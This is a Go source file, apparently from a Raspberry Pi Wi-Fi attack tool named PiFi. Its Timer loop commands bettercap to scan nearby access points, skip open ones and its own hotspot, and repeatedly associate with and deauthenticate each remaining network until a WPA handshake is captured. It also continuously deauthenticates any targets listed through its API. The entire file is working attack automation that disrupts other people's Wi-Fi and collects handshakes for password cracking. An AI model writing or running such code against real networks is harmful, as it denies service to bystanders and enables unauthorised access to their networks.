package main

import (
	"context"
	"strconv"
	"time"

	"github.com/czQery/PiFi/backend/api"
	"github.com/czQery/PiFi/backend/cmd"
	"github.com/czQery/PiFi/backend/net"
	"github.com/sirupsen/logrus"
	"github.com/tidwall/gjson"
)

func Timer() {

	var (
		ctx         = context.Background()
		aps         []gjson.Result
		handshakes  []net.Handshake
		bssid       string
		channel     string
		channelLast string
		err         error

		refreshTime = time.Now()
		capTime     = time.Now()
	)

	for range time.Tick(time.Second) {
		if time.Since(refreshTime) > cmd.CapRefresh {
			handshakes = net.DWPAGet(ctx)
			refreshTime = time.Now()
		}

		if time.Since(capTime) > cmd.CapDelay {
			aps, _ = cmd.GetBettercapAPs()
			channelLast = "0"

			for _, ap := range aps {
				bssid = ap.Get("mac").String()

				if !cmd.MonitorAuto || bssid == cmd.HotspotBSSID || ap.Get("encryption").String() == "OPEN" {
					continue
				}

				captured := false
				for _, handshake := range handshakes {
					if handshake.BSSID == bssid {
						captured = true
						break
					}
				}
				if captured {
					continue
				}

				channel = strconv.FormatInt(ap.Get("channel").Int(), 10)
				if channel != channelLast {
					err = cmd.SetBettercap("wifi.recon.channel " + channel)
					if err != nil {
						logrus.WithFields(logrus.Fields{
							"channel": channel,
							"err":     err.Error(),
						}).Error("timer - recon channel failed")
					}

					if channelLast != "0" {
						time.Sleep(cmd.CapDwell)
					}
				}

				err = cmd.SetBettercap("wifi.assoc " + bssid + ";wifi.deauth " + bssid)
				if err != nil {
					logrus.WithFields(logrus.Fields{
						"target": bssid,
						"err":    err.Error(),
					}).Error("timer - assoc+deauth failed")
				}

				channelLast = channel
			}

			err = cmd.SetBettercap("wifi.recon.channel clear")
			if err != nil {
				logrus.WithFields(logrus.Fields{
					"channel": "clear",
					"err":     err.Error(),
				}).Error("timer - recon channel failed")
			}
			capTime = time.Now()
		}

		api.DeauthTargets.Range(func(key, _ any) bool {
			if key.(string) == cmd.HotspotBSSID {
				return true
			}

			err = cmd.SetBettercap("wifi.deauth " + key.(string))
			if err != nil {
				api.DeauthTargets.Delete(key)
				logrus.WithFields(logrus.Fields{
					"target": key.(string),
					"err":    err.Error(),
				}).Error("timer - deauth failed")
			}
			return true
		})
	}
}
